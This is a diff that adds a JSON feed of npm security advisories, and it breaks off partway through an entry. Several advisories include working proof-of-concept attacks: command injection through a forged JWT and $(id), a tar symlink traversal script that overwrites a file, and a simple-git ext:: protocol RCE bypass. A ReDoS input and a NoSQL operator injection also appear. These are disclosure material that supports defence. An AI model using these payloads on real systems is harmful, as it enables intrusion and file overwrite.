@@ -1,0 +1,663 @@
+{
+  "schema_version": "1.2.0",
+  "generated_at": "2026-03-11T00:24:39Z",
+  "source_id": "npm_security_advisories",
+  "hash": "sha256:34c88242afeb79afe1934a1c46e8954c1960cddee8d80a85187bd8a8fc7512f6",
+  "prev_hash": "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+  "cursor": "sha256:d357cf36723bf931e72af71b39ab0b9e87f04a434713375e36c054d4ae0c47db",
+  "prev_cursor": "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+  "changed": true,
+  "ttl_sec": 1800,
+  "sources_included": [
+    "npm_security_advisories"
+  ],
+  "batch_narrative": "npm_security_advisories: 20 advisories (2 critical, 1 high).",
+  "buckets": {
+    "items": [
+      {
+        "source": "npm_security_advisories",
+        "id": "b109c9195e23498627f03c83af7bb107",
+        "url": "https://github.com/advisories/GHSA-7fv4-fmmc-86g2",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@siteboon/claude-code-ui] @siteboon/claude-code-ui is Vulnerable to Shell Command Injection in Git Routes",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-7fv4-fmmc-86g2"
+          ],
+          "content_hash": "sha256:30f4bab42e4674b3012d174cda4d9217ad0f537dc7dfa55f4e241c9b49e27ce1"
+        },
+        "source_payload": {
+          "content_html": "<h1 id=\"shell-command-injection-in-user-git-config-endpoint\">Shell Command Injection in User Git Config Endpoint</h1>\n<table>\n<thead>\n<tr>\n<th>Field</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Severity</strong></td>\n<td>High</td>\n</tr>\n<tr>\n<td><strong>CVSS 3.1</strong></td>\n<td>8.8 (High) — when chained with VULN-01</td>\n</tr>\n<tr>\n<td><strong>CWE</strong></td>\n<td>CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</td>\n</tr>\n<tr>\n<td><strong>Attack Vector</strong></td>\n<td>Network</td>\n</tr>\n<tr>\n<td><strong>Authentication</strong></td>\n<td>JWT required (bypassable via VULN-01)</td>\n</tr>\n<tr>\n<td><strong>Affected Files</strong></td>\n<td><code>server/routes/user.js</code> (lines 58-59)</td>\n</tr>\n</tbody></table>\n<h2 id=\"description\">Description</h2>\n<p>The <code>/api/user/git-config</code> endpoint constructs shell commands by interpolating user-supplied <code>gitName</code> and <code>gitEmail</code> values into command strings passed to <code>child_process.exec()</code>. The input is placed within double quotes and only <code>\"</code> is escaped, but backticks (<code>`</code>), <code>$()</code> command substitution, and <code>\\</code> sequences are all interpreted within double-quoted strings in bash.</p>\n<p>This allows authenticated attackers to execute arbitrary OS commands via the git configuration endpoint.</p>\n<h2 id=\"root-cause\">Root Cause</h2>\n<p><code>server/routes/user.js</code> lines 58-59:</p>\n<pre><code class=\"language-javascript\">await execAsync(`git config --global user.name \"${gitName.replace(/\"/g, '\\\\\"')}\"`);\nawait execAsync(`git config --global user.email \"${gitEmail.replace(/\"/g, '\\\\\"')}\"`);\n</code></pre>\n<p>Only <code>\"</code> is escaped. However, within double-quoted bash strings, the following are still interpreted:</p>\n<ul>\n<li><code>`malicious_command`</code> — backtick execution</li>\n<li><code>$(malicious_command)</code> — subshell execution</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li><strong>Remote Code Execution (RCE)</strong> — arbitrary OS commands execute as the Node.js process user</li>\n<li>The <code>git config --global</code> vector modifies the <strong>server-wide</strong> git configuration, affecting all git operations</li>\n<li>When chained with VULN-01 (hardcoded JWT), this is fully <strong>unauthenticated RCE</strong></li>\n<li>Attacker can: read/write any file, install backdoors, pivot to other systems, exfiltrate data</li>\n</ul>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-bash\"># Step 1: Forge a JWT (see VULN-01)\nTOKEN=$(python3 -c \"import jwt; print(jwt.encode({'userId':1,'username':'admin'}, 'claude-ui-dev-secret-change-in-production', algorithm='HS256'))\")\n\n# Step 2: Inject via gitName using command substitution\ncurl -X POST \"http://REDACTED:5173/api/user/git-config\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"gitName\":\"$(id)\",\"gitEmail\":\"attacker@example.com\"}'\n</code></pre>\n<p>The server executes:</p>\n<pre><code>git config --global user.name \"$(id)\"\n</code></pre>\n<p>Bash evaluates <code>$(id)</code> before passing it to git, executing the <code>id</code> command and setting the username to the output.</p>\n<h2 id=\"remediation\">Remediation</h2>\n<p>Replace <code>exec()</code> with <code>spawn()</code> (array arguments, no shell):</p>\n<pre><code class=\"language-javascript\">// BEFORE (vulnerable):\nawait execAsync(`git config --global user.name \"${gitName.replace(/\"/g, '\\\\\"')}\"`);\n\n// AFTER (safe):\nawait spawnAsync('git', ['config', '--global', 'user.name', gitName]);\nawait spawnAsync('git', ['config', '--global', 'user.email', gitEmail]);\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/siteboon/claudecodeui/security/advisories/GHSA-7fv4-fmmc-86g2\">https://github.com/siteboon/claudecodeui/security/advisories/GHSA-7fv4-fmmc-86g2</a></li>\n<li><a href=\"https://github.com/siteboon/claudecodeui/commit/86c33c1c0cb34176725a38f46960213714fc3e04\">https://github.com/siteboon/claudecodeui/commit/86c33c1c0cb34176725a38f46960213714fc3e04</a></li>\n<li><a href=\"https://github.com/siteboon/claudecodeui/releases/tag/v1.24.0\">https://github.com/siteboon/claudecodeui/releases/tag/v1.24.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fv4-fmmc-86g2\">https://github.com/advisories/GHSA-7fv4-fmmc-86g2</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T23:57:26.000Z",
+          "date_published": "2026-03-10T23:57:23.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-7fv4-fmmc-86g2"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "c93a153852c84f728bf8d0d655b197ea",
+        "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[file-type] file-type affected by infinite loop in ASF parser on malformed input with zero-size sub-header",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+          ],
+          "content_hash": "sha256:e679293a701702d06609c9d2ef3ad3e38ed0a92f4f3cc2cd8a98d05ede3083f1"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a <code>size</code> field of zero, the parser enters an infinite loop. The <code>payload</code> value becomes negative (-24), causing <code>tokenizer.ignore(payload)</code> to move the read position backwards, so the same sub-header is read repeatedly forever.</p>\n<p>Any application that uses <code>file-type</code> to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in version 21.3.1. Users should upgrade to &gt;= 21.3.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Validate or limit the size of input buffers before passing them to <code>file-type</code>, or run file type detection in a worker thread with a timeout.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f</li>\n</ul>\n<h3 id=\"reporter\">Reporter</h3>\n<p><a href=\"mailto:crnkovic@lokvica.com\">crnkovic@lokvica.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473\">https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-31808\">https://nvd.nist.gov/vuln/detail/CVE-2026-31808</a></li>\n<li><a href=\"https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f\">https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5v7r-6r5c-r473\">https://github.com/advisories/GHSA-5v7r-6r5c-r473</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T23:57:11.000Z",
+          "date_published": "2026-03-10T23:57:09.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "61f96819919d4275b73878db05b63b96",
+        "url": "https://github.com/advisories/GHSA-9ppj-qmqm-q256",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[tar] node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-9ppj-qmqm-q256"
+          ],
+          "content_hash": "sha256:92277612e577c2bad0d6df38e61faa16b855c5ab31e0493523ed8905d5e747b8"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>tar</code> (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as <code>C:../../../target.txt</code>, which enables file overwrite outside <code>cwd</code> during normal <code>tar.x()</code> extraction.</p>\n<h3 id=\"details\">Details</h3>\n<p>The extraction logic in <code>Unpack[STRIPABSOLUTEPATH]</code> validates <code>..</code> segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored <code>linkpath</code> to the stripped value.</p>\n<p>What happens with <code>linkpath: \"C:../../../target.txt\"</code>:</p>\n<ol>\n<li><code>stripAbsolutePath()</code> removes <code>C:</code> and rewrites the value to <code>../../../target.txt</code>.</li>\n<li>The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.</li>\n<li>Symlink creation uses the rewritten value (<code>../../../target.txt</code>) from nested path <code>a/b/l</code>.</li>\n<li>Writing through the extracted symlink overwrites the outside file (<code>../target.txt</code>).</li>\n</ol>\n<p>This is reachable in standard usage (<code>tar.x({ cwd, file })</code>) when extracting attacker-controlled tar archives.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Tested on Arch Linux with <code>tar@7.5.10</code>.</p>\n<p>PoC script (<code>poc.cjs</code>):</p>\n<pre><code class=\"language-js\">const fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() =&gt; {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n</code></pre>\n<p>Run:</p>\n<pre><code class=\"language-bash\">node poc.cjs &amp;&amp; readlink a/b/l &amp;&amp; ls -l a/b/l ../target.txt\n</code></pre>\n<p>Observed output:</p>\n<pre><code class=\"language-text\">PWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -&gt; ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n</code></pre>\n<p><code>PWNED</code> confirms outside file content overwrite. <code>readlink</code> and <code>ls -l</code> confirm the extracted symlink points outside the extraction directory.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.</p>\n<p>Realistic scenarios:</p>\n<ul>\n<li>CLI tools unpacking untrusted tarballs into a working directory</li>\n<li>build/update pipelines consuming third-party archives</li>\n<li>services that import user-supplied tar files</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256\">https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-31802\">https://nvd.nist.gov/vuln/detail/CVE-2026-31802</a></li>\n<li><a href=\"https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad\">https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9ppj-qmqm-q256\">https://github.com/advisories/GHSA-9ppj-qmqm-q256</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T23:44:59.000Z",
+          "date_published": "2026-03-10T23:44:58.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-9ppj-qmqm-q256"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "bef417cc23536a08f9c6d6f5f8e1861a",
+        "url": "https://github.com/advisories/GHSA-f45g-68q3-5w8x",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[elysia] Elysia has a string URL format ReDoS",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-f45g-68q3-5w8x"
+          ],
+          "content_hash": "sha256:5741cac03b61981d430af0fb08e6c81e8cafa8e77e07e35711b1358999d9111a"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><code>t.String({ format: 'url' })</code> is vulnerable to redos</p>\n<p>Repeating a partial url format (protocol and hostname) multiple times cause regex to slow down significantly</p>\n<pre><code class=\"language-js\">'http://a'.repeat(n)\n</code></pre>\n<p>Here's a table demonstrating how long it takes to process repeated partial url format</p>\n<table>\n<thead>\n<tr>\n<th><code>n</code> repeat</th>\n<th>elapsed_ms</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1024</td>\n<td>33.993</td>\n</tr>\n<tr>\n<td>2048</td>\n<td>134.357</td>\n</tr>\n<tr>\n<td>4096</td>\n<td>537.608</td>\n</tr>\n<tr>\n<td>8192</td>\n<td>2155.842</td>\n</tr>\n<tr>\n<td>16384</td>\n<td>8618.457</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>34604.139</td>\n</tr>\n</tbody></table>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched by 1.4.26, please kindly update <code>elysia</code> to &gt;= 1.4.26 </p>\n<p>Here's how long it takes after the patch</p>\n<table>\n<thead>\n<tr>\n<th><code>n</code> repeat</th>\n<th>elapsed_ms</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1024</td>\n<td>0.194</td>\n</tr>\n<tr>\n<td>2048</td>\n<td>0.274</td>\n</tr>\n<tr>\n<td>4096</td>\n<td>0.455</td>\n</tr>\n<tr>\n<td>8192</td>\n<td>0.831</td>\n</tr>\n<tr>\n<td>16384</td>\n<td>1.632</td>\n</tr>\n<tr>\n<td>32768</td>\n<td>3.052</td>\n</tr>\n</tbody></table>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ol>\n<li>It's recommended to always limit URL format to a reasonable length</li>\n</ol>\n<pre><code class=\"language-ts\">t.String({\n    format: 'url',\n    maxLength: 288\n})\n</code></pre>\n<ol start=\"2\">\n<li>If a long URL format is necessary, to patch this without updating to 1.4.26, add the following code to any part of your codebase</li>\n</ol>\n<pre><code class=\"language-js\">import { FormatRegistry } from '@sinclair/typebox'\n\nFormatRegistry.Delete('url')\nFormatRegistry.Set('url', (value) =&gt;\n    /^(?:https?|ftp):\\/\\/(?:[^\\s:@]+(?::[^\\s@]*)?@)?(?:(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z0-9\\u{00a1}-\\u{ffff}]+-)*[a-z0-9\\u{00a1}-\\u{ffff}]+)(?:\\.(?:[a-z0-9\\u{00a1}-\\u{ffff}]+-)*[a-z0-9\\u{00a1}-\\u{ffff}]+)*(?:\\.(?:[a-z\\u{00a1}-\\u{ffff}]{2,})))(?::\\d{2,5})?(?:\\/[^\\s]*)?$/iu.test(\n        value\n    )\n)\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/elysiajs/elysia/security/advisories/GHSA-f45g-68q3-5w8x\">https://github.com/elysiajs/elysia/security/advisories/GHSA-f45g-68q3-5w8x</a></li>\n<li><a href=\"https://github.com/EdamAme-x/elysia-poc-redos\">https://github.com/EdamAme-x/elysia-poc-redos</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30837\">https://nvd.nist.gov/vuln/detail/CVE-2026-30837</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f45g-68q3-5w8x\">https://github.com/advisories/GHSA-f45g-68q3-5w8x</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T22:55:50.000Z",
+          "date_published": "2026-03-10T21:04:25.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-f45g-68q3-5w8x"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "3ddaa21ca5be010d24d499a3a6d465fb",
+        "url": "https://github.com/advisories/GHSA-p9xr-7p9p-gpqx",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@feathersjs/mongodb] Feathers has a NoSQL Injection via WebSocket id Parameter in MongoDB Adapter",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-p9xr-7p9p-gpqx"
+          ],
+          "content_hash": "sha256:6c9eeb668a880fa821e0f3c74d6eea265f6ca530a185e0137ed9fc90ece62b0b"
+        },
+        "source_payload": {
+          "content_html": "<p>Socket.IO clients can send arbitrary JavaScript objects as the id argument to any service method (get, patch, update, remove). The transport layer performs no type checking on this argument. When the service uses the MongoDB adapter, these objects pass through getObjectId() and land directly in the MongoDB query as operators. Sending {$ne: null} as the id matches every document in the collection.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/feathersjs/feathers/security/advisories/GHSA-p9xr-7p9p-gpqx\">https://github.com/feathersjs/feathers/security/advisories/GHSA-p9xr-7p9p-gpqx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-29793\">https://nvd.nist.gov/vuln/detail/CVE-2026-29793</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9xr-7p9p-gpqx\">https://github.com/advisories/GHSA-p9xr-7p9p-gpqx</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T22:55:45.000Z",
+          "date_published": "2026-03-10T21:03:40.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-p9xr-7p9p-gpqx"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "a961b0fc30aa8af05b07b5c2d2841f94",
+        "url": "https://github.com/advisories/GHSA-wg9x-qfgw-pxhj",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@feathersjs/authentication-oauth] Feathers has an OAuth Callback Account Takeover issue",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-wg9x-qfgw-pxhj"
+          ],
+          "content_hash": "sha256:98d7e25ea9f21677695b99bfe091c7123683ab67259959f8a9185ceba2fdf0e6"
+        },
+        "source_payload": {
+          "content_html": "<p>An unauthenticated attacker can send a crafted GET request directly to <code>/oauth/:provider/callback</code> with a forged profile in the query string. The OAuth service's authentication payload has a fallback chain that reaches params.query (the raw request query) when Grant's session/state responses are empty. Since the attacker never initiated an OAuth authorize flow, Grant has no session to work with and produces no response, so the fallback fires. The forged profile then drives entity lookup and JWT minting. The attacker gets a valid access token for an existing user without ever contacting the OAuth provider. Critical (CVSS 9.8)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/feathersjs/feathers/security/advisories/GHSA-wg9x-qfgw-pxhj\">https://github.com/feathersjs/feathers/security/advisories/GHSA-wg9x-qfgw-pxhj</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-29792\">https://nvd.nist.gov/vuln/detail/CVE-2026-29792</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wg9x-qfgw-pxhj\">https://github.com/advisories/GHSA-wg9x-qfgw-pxhj</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T22:55:36.000Z",
+          "date_published": "2026-03-10T21:03:28.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-wg9x-qfgw-pxhj"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "d8c4be2c1fbe34603132e83a9a8b0018",
+        "url": "https://github.com/advisories/GHSA-r275-fr43-pm7q",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[simple-git] simple-git has blockUnsafeOperationsPlugin bypass via case-insensitive protocol.allow config key enables RCE",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-r275-fr43-pm7q"
+          ],
+          "content_hash": "sha256:ea86d106704144845d9bbcb435819db8afc4063aa3969731341fcf16e2155e19"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "npm Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
+              "evidence_url": "https://github.com/advisories/GHSA-r275-fr43-pm7q"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>blockUnsafeOperationsPlugin</code> in <code>simple-git</code> fails to block git protocol\noverride arguments when the config key is passed in uppercase or mixed case.\nAn attacker who controls arguments passed to git operations can enable the\n<code>ext::</code> protocol by passing <code>-c PROTOCOL.ALLOW=always</code>, which executes an\narbitrary OS command on the host machine.</p>\n<hr>\n<h3 id=\"details\">Details</h3>\n<p>The <code>preventProtocolOverride</code> function in\n<code>simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts</code> (line 24)\nchecks whether a <code>-c</code> argument configures <code>protocol.allow</code> using this regex:</p>\n<pre><code class=\"language-ts\">if (!/^\\s*protocol(.[a-z]+)?.allow/.test(next)) {\n   return;\n}\n</code></pre>\n<p>This regex is case-sensitive. Git treats config key names\ncase-insensitively — it normalises them to lowercase internally.\nAs a result, passing <code>PROTOCOL.ALLOW=always</code>, <code>Protocol.Allow=always</code>,\nor any mixed-case variant is not matched by the regex, the check\nreturns without throwing, and git is spawned with the unsafe argument.</p>\n<p><strong>Verification that git normalises the key:</strong></p>\n<pre><code class=\"language-bash\">$ git -c PROTOCOL.ALLOW=always config --list | grep protocol\nprotocol.allow=always\n</code></pre>\n<p><strong>The fix is a single character — add the <code>/i</code> flag:</strong></p>\n<pre><code class=\"language-ts\">// Before (vulnerable):\nif (!/^\\s*protocol(.[a-z]+)?.allow/.test(next)) {\n\n// After (fixed):\nif (!/^\\s*protocol(.[a-z]+)?.allow/i.test(next)) {\n</code></pre>\n<hr>\n<h2 id=\"pocjs\">poc.js</h2>\n<pre><code class=\"language-js\">/**\n * Proof of Concept — simple-git preventProtocolOverride Case-Sensitivity Bypass\n *\n * CVE-2022-25912 was fixed in simple-git@3.15.0 by adding a regex check\n * that blocks `-c protocol.*.allow=always` from being passed to git commands.\n * The regex is case-sensitive. Git treats config key names case-insensitively.\n * Passing `-c PROTOCOL.ALLOW=always` bypasses the check entirely.\n *\n * Affected : simple-git &gt;= 3.15.0 (all versions with the fix applied)\n * Tested on: simple-git@3.32.2, Node.js v23.11.0, git 2.39.5\n * Reporter : CodeAnt AI Security Research (securityreseach@codeant.ai)\n */\n\nconst simpleGit = require('simple-git');\nconst fs = require('fs');\n\nconst SENTINEL = '/tmp/pwn-codeant';\n\n// Clean up from any previous run\ntry { fs.unlinkSync(SENTINEL); } catch (_) {}\n\nconst git = simpleGit();\n\n// ── Original CVE-2022-25912 vector — BLOCKED by the 2022 fix ────────────────\n// This is the exact PoC Snyk used to report CVE-2022-25912.\n// It is correctly blocked by preventProtocolOverride in block-unsafe-operations-plugin.ts.\ngit.clone('ext::sh -c touch% /tmp/pwn-original% &gt;&amp;2', '/tmp/example-new-repo', [\n  '-c', 'protocol.ext.allow=always',   // lowercase — caught by regex\n]).catch((e) =&gt; {\n  console.log('ext:: executed:poc', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');\n  console.error(e);\n});\n\n// ── Bypass — PROTOCOL.ALLOW=always (uppercase) ──────────────────────────────\n// The fix regex /^\\s*protocol(.[a-z]+)?.allow/ is case-sensitive.\n// Git normalises config key names to lowercase internally.\n// Uppercase variant passes the check; git enables ext:: and executes the command.\ngit.clone('ext::sh -c touch% ' + SENTINEL + '% &gt;&amp;2', '/tmp/example-new-repo-2', [\n  '-c', 'PROTOCOL.ALLOW=always',       // uppercase — NOT caught by regex\n]).catch((e) =&gt; {\n  console.log('ext:: executed:', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');\n  console.error(e);\n});\n\n// ── Real-world scenario ──────────────────────────────────────────────────────\n// An application cloning a legitimate repository with user-controlled customArgs.\n// Attacker supplies PROTOCOL.ALLOW=always alongside a malicious ext:: URL.\n// The application intends to clone https://github.com/CodeAnt-AI/codeant-quality-gates\n// but the injected argument enables ext:: and the real URL executes the command instead.\n//\n// Legitimate usage (what the app expects):\n//   simpleGit().clone('https://github.com/CodeAnt-AI/codeant-quality-gates',\n//                     '/tmp/codeant-quality-gates', userArgs)\n//\n// Attacker-controlled scenario (what actually runs when args are not sanitised):\nconst LEGITIMATE_URL = 'https://github.com/CodeAnt-AI/codeant-quality-gates';\nconst CLONE_DEST     = '/tmp/codeant-quality-gates';\nconst SENTINEL_RW    = '/tmp/pwn-realworld';\ntry { fs.unlinkSync(SENTINEL_RW); } catch (_) {}\n\nconst userArgs   = ['-c', 'PROTOCOL.ALLOW=always'];\nconst attackerURL = 'ext::sh -c touch% ' + SENTINEL_RW + '% &gt;&amp;2';\n\nsimpleGit().clone(\n  attackerURL,   // should have been LEGITIMATE_URL\n  CLONE_DEST,\n  userArgs\n).catch(() =&gt; {\n  console.log('real-world scenario [target: ' + LEGITIMATE_URL + ']:',\n    fs.existsSync(SENTINEL_RW) ? 'PWNED — ' + SENTINEL_RW + ' created' : 'not created');\n});\n</code></pre>\n<hr>\n<h2 id=\"test-results\">Test Results</h2>\n<h3 id=\"vector-1--original-cve-2022-25912-protocolextallowalways-lowercase\">Vector 1 — Original CVE-2022-25912 (<code>protocol.ext.allow=always</code>, lowercase)</h3>\n<p><strong>Result: BLOCKED ✅</strong></p>\n<p>The original Snyk PoC payload using lowercase <code>protocol.ext.allow=always</code> is correctly intercepted by <code>preventProtocolOverride</code> before git is invoked. A <code>GitPluginError</code> is thrown immediately and the sentinel file is never created.</p>\n<p><strong>Output:</strong></p>\n<pre><code>ext:: executed:poc not created\nGitPluginError: Configuring protocol.allow is not permitted without enabling allowUnsafeExtProtocol\n    at preventProtocolOverride (.../simple-git/dist/cjs/index.js:1228:9)\n    at .../simple-git/dist/cjs/index.js:1266:40\n    at Array.forEach (&lt;anonymous&gt;)\n    at Object.action (.../simple-git/dist/cjs/index.js:1264:12)\n    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29)\n    at GitExecutorChain.attemptRemoteTask (.../simple-git/dist/cjs/index.js:1881:36)\n    at GitExecutorChain.attemptTask (.../simple-git/dist/cjs/index.js:1865:88) {\n  task: {\n    commands: [\n      'clone',\n      '-c',\n      'protocol.ext.allow=always',\n      'ext::sh -c touch% /tmp/pwn-original% &gt;&amp;2',\n      '/tmp/example-new-repo'\n    ],\n    format: 'utf-8',\n    parser: [Function: parser]\n  },\n  plugin: 'unsafe'\n}\n</code></pre>\n<hr>\n<h3 id=\"vector-2--uppercase-bypass-protocolallowalways\">Vector 2 — Uppercase bypass (<code>PROTOCOL.ALLOW=always</code>)</h3>\n<p><strong>Result: BYPASSED ⚠️ — RCE confirmed</strong></p>\n<p>The <code>preventProtocolOverride</code> regex <code>/^\\s*protocol(.[a-z]+)?.allow/</code> is case-sensitive. <code>PROTOCOL.ALLOW=always</code> (uppercase) passes the check without error. Git normalises config key names to lowercase internally, enabling the <code>ext::</code> protocol. The injected shell command executes before git errors on the missing repository stream.</p>\n<p><strong>Output:</strong></p>\n<pre><code>ext:: executed: PWNED — /tmp/pwn-codeant created\nGitError: Cloning into '/tmp/example-new-repo-2'...\nfatal: Could not read from remote 